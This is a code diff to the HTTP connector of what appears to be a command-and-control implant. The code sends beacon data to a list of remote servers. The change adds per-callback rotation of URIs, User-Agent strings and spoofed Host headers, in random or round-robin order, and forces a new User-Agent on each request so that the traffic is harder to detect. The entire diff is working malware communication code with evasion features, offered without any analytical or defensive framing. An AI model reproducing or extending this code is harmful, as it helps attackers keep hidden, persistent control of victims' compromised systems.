@@ -125,9 +125,14 @@ BOOL ConnectorHTTP::SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize)
 	this->server_ports   = profile.ports;
 	this->ssl            = profile.use_ssl;
 	this->http_method    = (CHAR*) profile.http_method;
-	this->uri            = (CHAR*) profile.uri;
-	this->user_agent     = (CHAR*) profile.user_agent;
-	this->ans_size		 = profile.ans_size;
+	this->uri_count      = profile.uri_count;
+	this->uris           = (CHAR**) profile.uris;
+	this->ua_count       = profile.ua_count;
+	this->user_agents    = (CHAR**) profile.user_agents;
+	this->hh_count       = profile.hh_count;
+	this->host_headers   = (CHAR**) profile.host_headers;
+	this->rotation_mode  = profile.rotation_mode;
+	this->ans_size       = profile.ans_size;
 	this->ans_pre_size   = profile.ans_pre_size;
 
 	this->proxy_type = profile.proxy_type;
@@ -190,15 +195,26 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 	BOOL  result = FALSE;
 	DWORD context = 0;
 
+	// Close existing handles to force new UA per call
+	if (this->hConnect) {
+		this->functions->InternetCloseHandle(this->hConnect);
+		this->hConnect = NULL;
+	}
+	if (this->hInternet) {
+		this->functions->InternetCloseHandle(this->hInternet);
+		this->hInternet = NULL;
+	}
+
 	while (!connected && attempt < this->server_count) {
 		DWORD dwError = 0;
 
 		if (!this->hInternet) {
+			CHAR* currentUA = this->user_agents[this->ua_index];
 			if (this->proxy_url != NULL) {
-				this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
+				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PROXY, this->proxy_url, NULL, 0);
 			}
 			else {
-				this->hInternet = this->functions->InternetOpenA(this->user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+				this->hInternet = this->functions->InternetOpenA(currentUA, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 			}
 		}
 		if (this->hInternet) {
@@ -214,7 +230,8 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 				if (this->ssl)
 					flags |= INTERNET_FLAG_SECURE;
 
-				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, this->uri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
+				CHAR* currentUri = this->uris[this->uri_index];
+				HINTERNET hRequest = this->functions->HttpOpenRequestA(this->hConnect, this->http_method, currentUri, 0, 0, rgpszAcceptTypes, flags, (DWORD_PTR)&context);
 				if (hRequest) {
 					if (this->ssl) {
 						DWORD dwFlags = 0;
@@ -234,7 +251,31 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 						}
 					}
 
-					connected = this->functions->HttpSendRequestA(hRequest, this->headers, (DWORD)_strlen(headers), (LPVOID)data, (DWORD)data_size);
+					// Build request headers with optional Host header
+					CHAR* reqHeaders = this->headers;
+					CHAR* tmpHeaders = NULL;
+					if (this->hh_count > 0) {
+						CHAR* currentHH = this->host_headers[this->hh_index];
+						ULONG hhLen = _strlen(currentHH);
+						ULONG baseLen = _strlen(this->headers);
+						// "Host: " (6) + hhLen + "\r\n" (2) + baseLen + null (1)
+						tmpHeaders = (CHAR*) this->functions->LocalAlloc(LPTR, 6 + hhLen + 2 + baseLen + 1);
+						ULONG off = 0;
+						tmpHeaders[off++] = 'H'; tmpHeaders[off++] = 'o'; tmpHeaders[off++] = 's';
+						tmpHeaders[off++] = 't'; tmpHeaders[off++] = ':'; tmpHeaders[off++] = ' ';
+						memcpy(tmpHeaders + off, currentHH, hhLen); off += hhLen;
+						tmpHeaders[off++] = '\r'; tmpHeaders[off++] = '\n';
+						memcpy(tmpHeaders + off, this->headers, baseLen); off += baseLen;
+						tmpHeaders[off] = 0;
+						reqHeaders = tmpHeaders;
+					}
+
+					connected = this->functions->HttpSendRequestA(hRequest, reqHeaders, (DWORD)_strlen(reqHeaders), (LPVOID)data, (DWORD)data_size);
+
+					if (tmpHeaders) {
+						memset(tmpHeaders, 0, _strlen(tmpHeaders));
+						this->functions->LocalFree(tmpHeaders);
+					}
 					if (connected) {
 						char statusCode[255];
 						DWORD statusCodeLenght = 255;
@@ -303,7 +344,6 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 
 			attempt++;
 			if (!connected) {
-				//if ( dwError == ERROR_INTERNET_CANNOT_CONNECT || dwError == ERROR_INTERNET_TIMEOUT ) {
 				if (this->hConnect) {
 					this->functions->InternetCloseHandle(this->hConnect);
 					this->hConnect = NULL;
@@ -315,11 +355,25 @@ void ConnectorHTTP::SendData(BYTE* data, ULONG data_size)
 
 				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 				this->functions->InternetSetOptionA(NULL, INTERNET_OPTION_REFRESH, NULL, 0);
-				//}
 
 				this->server_index = (this->server_index + 1) % this->server_count;
 			}
 		}
+	}
+
+	// Rotate indices for next callback (active round-robin)
+	if (this->rotation_mode == 1) {
+		this->uri_index    = GenerateRandom32() % this->uri_count;
+		this->ua_index     = GenerateRandom32() % this->ua_count;
+		this->server_index = GenerateRandom32() % this->server_count;
+		if (this->hh_count > 0)
+			this->hh_index = GenerateRandom32() % this->hh_count;
+	} else {
+		this->uri_index    = (this->uri_index + 1) % this->uri_count;
+		this->ua_index     = (this->ua_index + 1) % this->ua_count;
+		this->server_index = (this->server_index + 1) % this->server_count;
+		if (this->hh_count > 0)
+			this->hh_index = (this->hh_index + 1) % this->hh_count;
 	}
 }
 
